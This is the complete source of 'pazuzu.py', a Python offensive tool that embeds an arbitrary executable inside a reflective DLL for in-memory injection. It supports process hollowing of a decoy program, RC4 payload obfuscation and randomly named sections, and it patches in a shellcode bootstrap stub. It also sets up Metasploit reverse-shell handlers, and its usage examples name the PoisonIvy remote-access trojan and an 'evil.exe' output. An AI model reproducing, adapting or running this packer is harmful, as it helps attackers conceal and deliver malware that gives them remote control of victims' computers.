#!/usr/bin/env python
import pefile, sys, getopt, textwrap, os, string, subprocess, random, struct, binascii


class colors:
    BLUE = '\033[94m'
    GREEN = '\033[32m'
    RED = '\033[0;31m'
    DEFAULT = '\033[39m'
    ORANGE = '\033[33m'


# Credits to nOps for the SectionDoubleP class: http://git.n0p.cc/?p=SectionDoubleP.git
# This saves me a lot of work.
class SectionDoublePError(Exception):
    pass


class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                               self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = '\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders:])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections * 0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)

        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, '\x00' * FileAlignment)

        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in xrange(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)

            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)

        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                self.pe.FILE_HEADER.sizeof() + 0x3C)

        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)

        section_raw_address_offset = section_table_offset + 0x14

        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData + FileAlignment)

            section_raw_address_offset += 0x28

        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != '\x00':
                return False
        return True

    def push_back(self, Name, VirtualSize=0x00000000, VirtualAddress=0x00000000,
                  RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                  Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                  Characteristics=0xE00000E0, Data=""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.

            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.

            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):
            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment

            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                          self.pe.sections[-1].VirtualAddress)
                    or VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress = \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                         (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress = \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize < len(Data):
                VirtualSize = len(Data)

            # Deleted to work with pazuzu (no padding needed when run it from disk)
            '''
            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += '\x00' * (FileAlignment - (len(Data) % FileAlignment))
            '''

            if RawSize != len(Data):
                if (    RawSize > len(Data) and (RawSize % FileAlignment) == 0):
                    Data += '\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                    self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                                section_table_offset + (self.pe.FILE_HEADER.NumberOfSections + 1) * 0x28
                        or not self.__is_null_data(self.pe.get_data(section_table_offset +
                                                                            (
                                                                                    self.pe.FILE_HEADER.NumberOfSections) * 0x28,
                                                                    0x28))):

                # Checking if more space can be added.
                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:

                    self.__add_header_space()
                    print "Additional space to add a new section header was allocated."
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                                   self.pe.sections[-1].SizeOfRawData)):
                RawAddress = \
                    (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
                                    self.pe.__data__[RawAddress:])

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections * 0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset + 0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset + 0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset + 0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset + 0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset + 0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset + 0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset + 0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset + 0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset + 0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections += 1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " + \
                                      "size of the sections list of pefile don't match.")

        return self.pe


# Print some fields of each section
def info_section(section, pe, len):
    data = pe.get_memory_mapped_image()[section.VirtualAddress:]
    print "    New section added: %s" % (section.Name)
    print "      VirtualAddres: %s\n      VirtualSize: %d\n      RawSize: %s" % (hex(section.VirtualAddress),
                                                                                 section.Misc_VirtualSize,
                                                                                 hex(section.SizeOfRawData))
    print "      Dump: "
    print  textwrap.fill(repr(data[0:len]), 80, initial_indent='        ', subsequent_indent='        ')


# Summary info about the final pazuzu DLL (with the embedded payload)
def info_dll(pe):
    print colors.GREEN + "\n[*] Pazuzu DLL info:"
    print colors.DEFAULT + "    SizeOfImage: %s (%d bytes)" % (
        hex(pe.OPTIONAL_HEADER.SizeOfImage), pe.OPTIONAL_HEADER.SizeOfImage)
    if (".Conf" in pe.sections[-2].Name):
        info_section(pe.sections[-2], pe, 60)
    info_section(pe.sections[-1], pe, 120)


# Verbose info about the payload inserted in the DLL
def verbose_payload_info(pe):
    print colors.DEFAULT + "    Number of sections: %d" % (pe.FILE_HEADER.NumberOfSections)
    for section in pe.sections:
        if ".reloc" in section.Name:
            print colors.BLUE + "      %-8s VirtualAddres: %-8s  VirtualSize: %-8d" \
                                % (
                section.Name.rstrip(' \0'), hex(section.VirtualAddress), section.Misc_VirtualSize) + colors.DEFAULT
        else:
            print "      %-8s VirtualAddres: %-8s  VirtualSize: %-8d " % (section.Name.rstrip(' \0'), \
                                                                          hex(section.VirtualAddress),
                                                                          section.Misc_VirtualSize)

    print "    ImageBase: %s" % hex(pe.OPTIONAL_HEADER.ImageBase)
    print "    Entry Point: %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase)


# I'm really proud of this ASCII art. Maybe this is the best part of the script.
# I feel pazuzu inside me ............... http://en.wikipedia.org/wiki/Pazuzu
def banner():
    print colors.RED + "NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNNNNNNN"
    print        "NNNNNNNNNNNm/o//mNNNNNNNNNNh.+/NNNNNNNNNNNNm//+-mNNNNNNNNNN"
    print        "NNNNNNNNNNN+.o`--mNNNNNNNd/.+y+/odNNNNNNNNm-:.---sNNNNNNNNN"
    print        "NNNNNNNNNo.-+-.---mNNNNdo-`:++o:+/:hNNNNNm.--:-`+-dNNNNNNNN"
    print        "NNNNNNNNh.o-..`.--:NNNNm---o/+++:+-NNNNNN--:--::+s:NNNNNNNN"
    print        "NNNNNNNm/..-:/:-..`+mNNNd+-:::/--+mNNNNN/-/--``-.:/oNNNNNNN"
    print        "NNNNNNNos-/osy.+o-`:-oNNNN/-:::-/mNNNms:.`---.`-.`.sNNNNNNN"
    print        "NNNNNNNy..-dddy+`..----yNNd`./s`+NNd/.-::``-----..`dNNNNNNN"
    print        "NNNNNNNN---`+h`.-:-`:--.--.:-odo//-...-:--` --`..+:yNNNNNNN"
    print        "NNNNNNNNm/--.+s-----.`.oyodh+//smydss:`./:-`.---..+NNNNNNNN"
    print        "NNNNNNNNNN+..`+h::/:`oho/yNNd+yNNd+ydms`:--- .-.-yNNNNNNNNN"
    print        "NNNNNNNNNNN/`:.+mo.`oh::.`:/odh+//y.-sm../-/.`.-mNNNNNNNNNN"
    print        "NNNNNNNNNNNy.-:`sNhso--:-.-/:`hNs+h.`oN+./+//.:/NNNNNNNNNNN"
    print        "NNNNNNNNNNNNh-::-/o:.-.`-.::-`hNy+h.`+ss`-:--:sNNNNNNNNNNNN"
    print colors.ORANGE + "<<<<<<<<<<<<<<<<<<<<<< @BorjaMerino (www.shelliscoming.com)"


# Help info
def usage():
    print colors.GREEN + "\nUsage: pazuzu.py -f payload.exe <options>	"
    print colors.DEFAULT + "-h --help               - Print Help"
    print "-f <binary>             - Binary (exe) to be executed"
    print "-k <decoy binary>       - Full path of the binary to be hollowed out (default: notepad.exe)"
    print "-w                      - Force dynamic forking"
    print "-d                      - Download and run (noisy option)"
    print "-p <thread|process|seh> - Patch the reflective DLL with the bootstrap shellcode "
    print "-o <name>               - Output file (default: pazuzu.dll)"
    print "-x                      - Payload obfuscation (RC4 cipher)"
    print "-v                      - Verbose output"
    print
    print colors.GREEN + "Examples: "
    print colors.DEFAULT + "python pazuzu.py -f poisonIvy.exe -v"
    print "python pazuzu.py -f payload.exe -x -k c:\\\windows\\\system32\\\calc.exe"
    print "python pazuzu.py -f payload.exe -w -o evil.exe -p thread"


# Check if the binary is .net app (look for the mscoree.dll)
def check_net(pe):
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for module in pe.DIRECTORY_ENTRY_IMPORT:
            if "mscoree.dll" in module.dll:
                return True
    return False


# Summary info about the options chosen by the user
def summary_payload(conf, pe_buf):
    print colors.ORANGE

    if (conf.has_key('d')):
        print conf['d']
        payload = "./dlls/download-x86.dll"
    elif (check_net(pe_buf)):
        print "[?] It seems a .NET payload. The download and run approach is taken"
        payload = "./dlls/download-x86.dll"  # this will be changed soon to another paylaod
    else:

        if (conf.has_key('w')) or not (hasattr(pe_buf, 'DIRECTORY_ENTRY_BASERELOC')):
            print "[+] The payload will use dynamic forking"
            if (conf.has_key('k')):
                print conf['k'][0] + " " + conf['k'][1]
            payload = "./dlls/dforking-x86.dll"
        elif hasattr(pe_buf, 'DIRECTORY_ENTRY_BASERELOC'):
            print "[+] The binary will be relocated in the same address space of the target (.reloc present)"
            payload = "./dlls/reloc-x86.dll"

    print colors.DEFAULT
    if (conf.has_key('v')):
        print colors.GREEN + "[*] Info payload: "
        verbose_payload_info(pe_buf)

    return payload


def get_file_offset(pe):
    rva = ''
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if "ReflectiveLoader" in export.name:
                rva = export.address
                print colors.GREEN + "[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (
                    export.name, export.ordinal, rva)
                break;

    if not rva:
        print colors.RED + "[!] Reflective export function not found. You sure it's a reflective DLL?"
        restore(1)

    offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
    offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

    # Correct 7 bytes
    offset_file -= 7

    # Return little endian version
    return struct.pack("<I", offset_file).encode('hex')


def patch_stub(offset_file, exit_addr):
    stub = ("\x4D"  # dec ebp             ; M
            "\x5A"  # pop edx             ; Z
            "\xE8\x00\x00\x00\x00"  # call 0              ; call nexmsn ls t instruction
            "\x5B"  # pop ebx             ; get our location (+7)
            "\x52"  # push edx            ; push edx back
            "\x45"  # inc ebp             ; restore ebp
            "\x55"  # push ebp            ; save ebp
            "\x89\xE5"  # mov ebp, esp        ; setup fresh stack frame
            "\x81\xC3" + offset_file.decode('hex') +  # add ebx, 0x???????? ; add offset to ReflectiveLoader
            "\xFF\xD3"  # call ebx            ; call ReflectiveLoader
            "\x89\xC3"  # mov ebx, eax        ; save DllMain for second call
            "\x57"  # push edi            ; our socket
            "\x68\x04\x00\x00\x00"  # push 0x4            ; signal we have attached
            "\x50"  # push eax            ; some value for hinstance
            "\xFF\xD0"  # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
            "\x68" + exit_addr +  # push 0x????????     ; our EXITFUNC placeholder
            "\x68\x05\x00\x00\x00"  # push 0x5            ; signal we have detached
            "\x50"  # push eax            ; some value for hinstance
            "\xFF\xD3")  # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
    return stub


def reflectivePatcher(dll, exit_func):
    exit_method = {'thread': '\xE0\x1D\x2A\x0A', 'seh': '\xFE\x0E\x32\xEA', 'process': '\xF0\xB5\xA2\x56'}

    if exit_func not in exit_method:
        print colors.RED + "[!] Not valid exit method: %s is not patched" % (dll)
        restore(1)

    try:
        pe = pefile.PE(dll)
    except IOError as e:
        print str(e)
        restore(1)

    offset_file = get_file_offset(pe)
    stub = patch_stub(offset_file, exit_func)

    src = file(dll, 'r+')
    payload = src.read()
    src.seek(0)
    # Relfective = Size payload + stub + (payload - stub)
    reflective_payload = struct.pack("<I", len(payload)) + stub + payload[len(stub):]

    src.write(reflective_payload)
    src.close()
    print colors.GREEN + "[*] Patched! (%d bytes)." % (len(reflective_payload))


# Gather the user args
def get_options(opts):
    conf = {}
    for a, p in opts:
        if a in ("-h", "--help"):
            usage()
            restore(1)
        elif a in ("-f"):
            try:
                buffer = open(p, "rb").read()
            except IOError as e:
                print colors.RED + str(e)
                restore(1)
            found_f = True
        elif a in ("-k"):
            conf['k'] = ("[+] Dummy program used: ", p)
        elif a in ("-o"):
            conf['output'] = p
        elif a in ("-w"):
            conf['w'] = ''
        elif a in ("-d"):
            conf['d'] = "[+] The payload will be downloaded and execute from disk"
        elif a in ("-m"):
            conf['msf'] = ''
        elif a in ("-p"):
            conf['p'] = p
        elif a in ("-x"):
            conf['x'] = ''
        elif a in ("-v"):
            conf['v'] = ''

    if 'buffer' not in locals():
        print colors.RED + "The parameter -f is mandatory. Type -h for help."
        restore(1)

    return buffer, conf


# Restore terminal color
def restore(ext):
    print(colors.DEFAULT)
    sys.exit(ext)


'''
def config(pe,conf):
   if 'path' in conf:
      found = False
      if hasattr(pe, 'VS_VERSIONINFO'):
        if hasattr(pe, 'FileInfo'):
          for entry in pe.FileInfo:
            if hasattr(entry, 'StringTable'):
              for st_entry in entry.StringTable:
                for str_entry in st_entry.entries.items():
                   if u'FileDescription' in str_entry:
                     print colors.ORANGE + "[+] Path for dynamic forking added: " + conf['path']
                     st_entry.entries.update({u'FileDescription':unicode(conf['path'])})
                     found = True
      if not found:
          print colors.RED + "[-] Dynamic forking path no updated. Default will be used "
'''

# MSF conf. Just for debugging purposes
def msf_conf(dll):
    path_rc = "/tmp/msf_conf"
    filemsf = file(path_rc, "w")
    filemsf.write("use multi/handler\nset PAYLOAD windows/dllinject/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 8080\n")
    filemsf.write("set DLL %s\nset ExitOnSession false\n run -j\r\n\r\n" % (dll))
    filemsf.close()
    return path_rc


# Dump final dll and patch it with the bootstrap shellcode if it's requested"
def dump_payload(conf, pe):
    if 'output' in conf:
        output_dll = conf['output']
    else:
        output_dll = "pazuzu.dll"

    pe.write(filename=output_dll)
    size_payload = os.path.getsize(output_dll)
    if size_payload > 4194304:
        print colors.RED + "[!] Binary too long (%d bytes). Be sure your stager allocates enough memory" % size_payload
        print "    Some metasploit stagers allocates just 4194304 bytes (0x00400000)"
    print colors.GREEN + "[*] Dll dumped: %s (%d bytes)" % (output_dll, size_payload)

    if (conf.has_key('p')):
        reflectivePatcher(output_dll, conf['p'])

    # Run msfconsole (-m option). Just for for debugging purposes
    if (conf.has_key("msf")):
        print colors.GREEN + "[*] Running msfconsole ..."
        subprocess.Popen(
            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/dllinject/reverse_winhttp; set LHOST 0.0.0.0; set DLL %s; set LPORT 8080; run -j'" % (
                output_dll), shell=True).wait()


# RC4 random sbox
def rc4_sbox_random(value):
  print "[*] RC4 payload encryption... Random key: 0x%s" % value + value[::-1]
  # '00112233' --> [00,11,22,33]
  key = [int(value[i:i+2],16) for i in range(0, len(value), 2)]
  # Change this as you please to get a key_len > 8
  key = key + key[::-1]
  key_len = key.__len__()
  Sbox = range(256)
  j = 0
  for i in range(256):
    j = (j + Sbox[i] + key[i % key_len]) % 256
    Sbox[i], Sbox[j] = Sbox[j], Sbox[i]
  return Sbox

# RC4 keystreamm and XOR'ing
def rc4_encrypt(Sbox,buffer):
  i = 0
  j = 0
  coded = []
  for x in range(len(buffer)):
    i = (i + 1) % 256
    j = (j + Sbox[i]) % 256
    Sbox[i], Sbox[j] = Sbox[j], Sbox[i]  # swap

    R = Sbox[(Sbox[i] + Sbox[j]) % 256]
    coded.append(ord(buffer[x]) ^ R)

  print "[*] Payload encrypted"
  return ''.join(chr(x) for x in coded)

def rc4_cipher(buffer,key):
  Sbox = rc4_sbox_random(key)
  return rc4_encrypt(Sbox,buffer)


def main(argv):
    banner()

    # Options allowed
    try:
        opts, args = getopt.getopt(sys.argv[1:], "f:hwxmdvk::o:p:",
                                   ["help", "file", "exitprocess", "fork", "reflective", "force-forking", "name"])
    except getopt.GetoptError as err:
        print colors.RED + "Error: %s. Type -h for help" % (str(err))
        restore(1)

    # Get payload and options
    buffer, conf = get_options(opts)
    pe_buf = pefile.PE(data=buffer)
    payload = summary_payload(conf, pe_buf)

    try:
        pe = pefile.PE(payload)  # Reflective DLL name
        # Some bytes in the TimeDateStamp could be useful to change the behaviour of the dll
        pe.FILE_HEADER.TimeDateStamp = 0x00000000
        print colors.GREEN + "[*] %s loaded" % payload
    except IOError as e:
        print colors.RED + str(e)
        restore(1)

    # Ofuscate with RC4?
    if conf.has_key("x"):
    # Random key in TimeDataStamp
      pe.FILE_HEADER.TimeDateStamp = int(binascii.hexlify(os.urandom(4)),16)
      buffer = rc4_cipher(buffer,format(pe.FILE_HEADER.TimeDateStamp,'x'))

    sections = SectionDoubleP(pe)

    # If dynamic forking and -k option, add .Conf section
    if (conf.has_key("k") and ("forking" in payload)):
        try:
            pe = sections.push_back(Characteristics=0x60000020, Data=conf['k'][1], Name=".Conf")
        except SectionDoublePError as e:
            print colors.RED + str(e)
            restore(1)

    try:
        sectionName = '.' + ''.join(random.choice(string.lowercase) for i in range(random.randint(1, 6)))
        pe = sections.push_back(Characteristics=0x60000020, Data=buffer, RawSize=0x00000000, Name=sectionName)
    except SectionDoublePError as e:
        print colors.RED + str(e)
        restore(1)

    if (conf.has_key('v')):
        info_dll(pe)

    dump_payload(conf, pe)
    restore(0)


if __name__ == '__main__':
    main(sys.argv[1:])
